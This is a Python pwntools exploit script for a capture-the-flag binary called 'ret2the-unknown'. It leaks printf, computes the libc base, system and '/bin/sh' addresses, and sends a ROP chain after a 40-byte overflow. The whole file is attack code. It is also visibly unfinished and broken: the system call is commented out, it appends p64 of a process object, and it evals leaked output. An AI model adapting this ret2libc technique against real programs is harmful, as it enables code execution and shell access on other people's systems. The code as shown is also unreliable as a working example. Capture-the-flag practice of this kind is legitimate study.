from pwn import *

FILENAME = 'ret2the-unknown'
libc = ELF("./libc-2.28.so")
context.binary = elf = ELF(FILENAME)

p = process(FILENAME)

def extract_printf(output):
    print(output)
    output = output.replace(b"that board meeting was a *smashing* success! rob loved the challenge!\nin fact, he loved it so much he sponsored me a business trip to this place called 'libc'...\nwhere is this place? can you help me get there safely?\n", b"")
    output = output.replace(b"phew, good to know. shoot! i forgot!\nrob said i'd need this to get there: ", b"").replace(b"\ngood luck!\n", b'')
    addr = output
    print(output)
    return eval("0x"+addr.decode())
    
p.sendline(b"A"*40)
res = p.recv()
printf_addr = extract_printf(res)
log.info(f"printf_addr: {hex(printf_addr)}")

libc.address = printf_addr - libc.sym.printf
binsh = next(libc.search(b"/bin/sh")) # Correct
system = libc.address + libc.sym.system
print(hex(binsh - libc.address))
print(hex(system), hex(printf_addr))
rop = ROP([libc, elf])
rop.main()
rop.main()
rop.main()
#rop.puts(binsh)
#rop.system(binsh)

print(rop.dump())

payload = flat({ 40: rop.chain() })
print(payload)
p.sendline(payload+p64(p))#b"A"*40+p64(elf.symbols['printf']))
p.interactive()
